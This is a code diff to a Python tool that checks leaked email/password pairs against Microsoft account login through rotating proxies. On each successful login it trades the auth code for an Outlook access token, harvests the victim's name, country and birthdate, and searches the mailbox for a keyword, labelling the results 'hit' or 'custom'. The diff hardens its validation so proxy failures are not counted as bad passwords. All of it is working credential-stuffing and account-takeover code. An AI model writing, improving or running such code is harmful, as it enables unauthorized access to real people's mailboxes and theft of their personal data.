@@ -9,7 +9,7 @@ from proxy_manager import proxy_manager
 _ua = UserAgent()
 
 PROXY_RETRIES = 5
-DIRECT_FALLBACK = False  # KIKAPCSOLVA! Csak proxyval dolgozik!
+DIRECT_FALLBACK = False
 
 
 def generate_user_agent():
@@ -88,14 +88,24 @@ def _do_check(session, email, password, keyword):
         response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
         response_text = response.text
 
-        # ============ VÁLASZ ELLENŐRZÉS ============
-        if len(response_text) < 1000:
+        if len(response_text) < 5000:
             return {"status": "error", "reason": "Response too short"}
 
-        if "PPFT" not in response_text and "urlPost" not in response_text and "login.live.com" not in response_text:
-            return {"status": "error", "reason": "Not Microsoft page"}
+        microsoft_markers = 0
+        if "login.microsoftonline.com" in response_text or "login.live.com" in response_text:
+            microsoft_markers += 1
+        if "PPFT" in response_text:
+            microsoft_markers += 1
+        if "urlPost" in response_text:
+            microsoft_markers += 1
+        if "sCtx" in response_text:
+            microsoft_markers += 1
+        if "sFTTag" in response_text:
+            microsoft_markers += 1
 
-        # ============ PPFT & urlPost ============
+        if microsoft_markers < 3:
+            return {"status": "error", "reason": "Not real Microsoft page"}
+
         PPFT = ""
         urlPost = ""
 
@@ -130,11 +140,12 @@ def _do_check(session, email, password, keyword):
             if urlpost_match:
                 urlPost = urlpost_match.group(1)
 
-        if not PPFT or not urlPost:
-            # Nem találtuk → proxy torzította → retry
-            return {"status": "error", "reason": "No PPFT/urlPost"}
+        if not PPFT or len(PPFT) < 200:
+            return {"status": "error", "reason": "Invalid PPFT"}
 
-        # ============ POST CREDENTIALS ============
+        if not urlPost or "login.live.com" not in urlPost:
+            return {"status": "error", "reason": "Invalid urlPost"}
+
         cookies_dict = session.cookies.get_dict()
         MSPRequ = cookies_dict.get('MSPRequ', '')
         uaid_cookie = cookies_dict.get('uaid', '')
@@ -182,82 +193,87 @@ def _do_check(session, email, password, keyword):
             allow_redirects=False, timeout=30
         )
 
-        # ============ VÁLASZ ELLENŐRZÉS ============
         post_text = post_response.text if post_response.text else ""
         cookies_dict = session.cookies.get_dict()
 
-        # Ha a POST válasz túl rövid vagy nem Microsoft → proxy hiba
-        if post_response.status_code >= 500:
-            return {"status": "error", "reason": f"Server error {post_response.status_code}"}
+        auth_cookie = cookies_dict.get("__Host-MSAAUTHP", "")
 
-        # ============ AUTH COOKIE ELLENŐRZÉS ============
-        if "__Host-MSAAUTHP" not in cookies_dict:
-            # FONTOS: Ellenőrizzük hogy VALÓBAN Microsoft válaszolt-e
-            # Ha igen → tényleg rossz jelszó (BAD)
-            # Ha nem → proxy torzította → retry (ERROR)
-
-            is_real_microsoft = (
-                "login.live.com" in post_text
-                or "PPFT" in post_text
-                or "sErrTxt" in post_text
-                or "urlPost" in post_text
-                or "recover?mkt" in post_text
-                or "Sign in" in post_text
-                or post_response.status_code in [200, 302]
+        if not auth_cookie:
+            is_real_error = (
+                "sErrTxt" in post_text or
+                "Your account or password is incorrect" in post_text or
+                "Sign in" in post_text or
+                "PPFT" in post_text or
+                "urlPost" in post_text
             )
 
-            if is_real_microsoft:
+            if is_real_error and len(post_text) > 5000:
                 return {"status": "bad", "reason": "Wrong password"}
             else:
-                return {"status": "error", "reason": "Post response not Microsoft"}
+                return {"status": "error", "reason": "No auth cookie, suspicious response"}
 
-        # ============ AUTH CODE ============
+        if len(auth_cookie) < 100:
+            return {"status": "error", "reason": "Fake auth cookie"}
+
         auth_code = ""
         if post_response.status_code in [301, 302, 303, 307, 308]:
             redirect_url = post_response.headers.get('Location', '')
             if redirect_url and 'msauth://' in redirect_url and 'code=' in redirect_url:
-                auth_code = redirect_url.split('code=')[1].split('&')[0]
+                code_part = redirect_url.split('code=')[1].split('&')[0]
+                if len(code_part) > 100:
+                    auth_code = code_part
         else:
             redirect_pattern = r'window\.location\s*=\s*["\']([^"\']+)["\']'
             redirect_match = re.search(redirect_pattern, post_text)
             if redirect_match:
                 redirect_url = redirect_match.group(1)
                 if 'msauth://' in redirect_url and 'code=' in redirect_url:
-                    auth_code = redirect_url.split('code=')[1].split('&')[0]
+                    code_part = redirect_url.split('code=')[1].split('&')[0]
+                    if len(code_part) > 100:
+                        auth_code = code_part
 
         CID = cookies_dict.get('MSPCID', '')
         if CID:
             CID = CID.upper()
 
-        # ============ ACCESS TOKEN ============
+        if not CID or len(CID) < 10:
+            return {"status": "error", "reason": "Invalid CID"}
+
+        if not auth_code:
+            return {"status": "error", "reason": "No valid auth code"}
+
         access_token = ""
-        if auth_code:
-            url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
-            data_token = {
-                "client_info": "1",
-                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
-                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
-                "grant_type": "authorization_code",
-                "code": auth_code,
-                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
-            }
-            try:
-                token_response = requests.post(
-                    url_token, data=data_token,
-                    headers={"Content-Type": "application/x-www-form-urlencoded"},
-                    timeout=30
-                )
-                if token_response.status_code == 200:
-                    token_data = token_response.json()
-                    access_token = token_data.get("access_token", "")
-            except:
-                pass
+        url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
+        data_token = {
+            "client_info": "1",
+            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+            "grant_type": "authorization_code",
+            "code": auth_code,
+            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
+        }
 
-        if not access_token or not CID:
-            # Auth sikerült de token nem jött → hálózati hiba → retry
-            return {"status": "error", "reason": "No token after auth"}
+        try:
+            token_response = requests.post(
+                url_token, data=data_token,
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
+                timeout=30
+            )
+            if token_response.status_code == 200:
+                token_data = token_response.json()
+                access_token = token_data.get("access_token", "")
 
-        # ============ PROFILE ============
+                if len(access_token) < 500:
+                    return {"status": "error", "reason": "Invalid access token"}
+
+                if access_token.count('.') != 2:
+                    return {"status": "error", "reason": "Malformed access token"}
+        except:
+            return {"status": "error", "reason": "Token request failed"}
+
+        if not access_token:
+            return {"status": "error", "reason": "No access token"}
+
         Name = ""
         Country = ""
         Birthdate = "N/A"
@@ -279,23 +295,37 @@ def _do_check(session, email, password, keyword):
 
         try:
             pRes = requests.get(profile_url, headers=profile_headers, timeout=30)
-            if pRes.status_code == 200:
-                profile_data = pRes.json()
-                if "accounts" in profile_data and profile_data["accounts"]:
-                    first_account = profile_data["accounts"][0]
-                    Country = first_account.get("location", "")
-                    BD = first_account.get("birthDay", "")
-                    BM = first_account.get("birthMonth", "")
-                    BY = first_account.get("birthYear", "")
-                    if BD and BM and BY:
-                        Birthdate = f"{BY}-{str(BM).zfill(2)}-{str(BD).zfill(2)}"
-                if "names" in profile_data and profile_data["names"]:
-                    first_name = profile_data["names"][0]
-                    Name = first_name.get("displayName", "")
-        except:
-            pass
 
-        # ============ EMAIL SEARCH ============
+            if pRes.status_code != 200:
+                return {"status": "error", "reason": f"Profile API error {pRes.status_code}"}
+
+            profile_text = pRes.text
+            if len(profile_text) < 100:
+                return {"status": "error", "reason": "Profile response too short"}
+
+            try:
+                profile_data = pRes.json()
+            except:
+                return {"status": "error", "reason": "Invalid profile JSON"}
+
+            if "accounts" not in profile_data and "names" not in profile_data:
+                return {"status": "error", "reason": "Not a real profile response"}
+
+            if "accounts" in profile_data and profile_data["accounts"]:
+                first_account = profile_data["accounts"][0]
+                Country = first_account.get("location", "")
+                BD = first_account.get("birthDay", "")
+                BM = first_account.get("birthMonth", "")
+                BY = first_account.get("birthYear", "")
+                if BD and BM and BY:
+                    Birthdate = f"{BY}-{str(BM).zfill(2)}-{str(BD).zfill(2)}"
+            if "names" in profile_data and profile_data["names"]:
+                first_name = profile_data["names"][0]
+                Name = first_name.get("displayName", "")
+
+        except requests.exceptions.RequestException:
+            return {"status": "error", "reason": "Profile request failed"}
+
         search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
         search_payload = {
             "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
@@ -363,25 +393,25 @@ def _do_check(session, email, password, keyword):
             if search_response.status_code == 200:
                 search_text = search_response.text
 
-                date_start = search_text.find('"LastModifiedTime":"')
-                if date_start != -1:
-                    date_start += len('"LastModifiedTime":"')
-                    date_end = search_text.find('"', date_start)
-                    raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
-                    if raw_date != "N/A":
-                        Date = raw_date.replace("T", " ")[:16]
+                if len(search_text) >= 50:
+                    date_start = search_text.find('"LastModifiedTime":"')
+                    if date_start != -1:
+                        date_start += len('"LastModifiedTime":"')
+                        date_end = search_text.find('"', date_start)
+                        raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
+                        if raw_date != "N/A":
+                            Date = raw_date.replace("T", " ")[:16]
 
-                total_start = search_text.find('"Total":')
-                if total_start != -1:
-                    total_start += len('"Total":')
-                    total_end = search_text.find(',', total_start)
-                    if total_end == -1:
-                        total_end = search_text.find('}', total_start)
-                    Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
+                    total_start = search_text.find('"Total":')
+                    if total_start != -1:
+                        total_start += len('"Total":')
+                        total_end = search_text.find(',', total_start)
+                        if total_end == -1:
+                            total_end = search_text.find('}', total_start)
+                        Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
         except:
             pass
 
-        # ============ EREDMÉNY ============
         if Total != "0" and Total != "NO":
             return {
                 "status": "hit",
@@ -395,7 +425,7 @@ def _do_check(session, email, password, keyword):
                     "mails": Total,
                 },
             }
-        elif Name or Country:
+        else:
             return {
                 "status": "custom",
                 "data": {
@@ -406,8 +436,6 @@ def _do_check(session, email, password, keyword):
                     "birthdate": Birthdate,
                 },
             }
-        else:
-            return {"status": "bad", "reason": "No data"}
 
     except requests.exceptions.ProxyError:
         return {"status": "error", "reason": "Proxy error"}
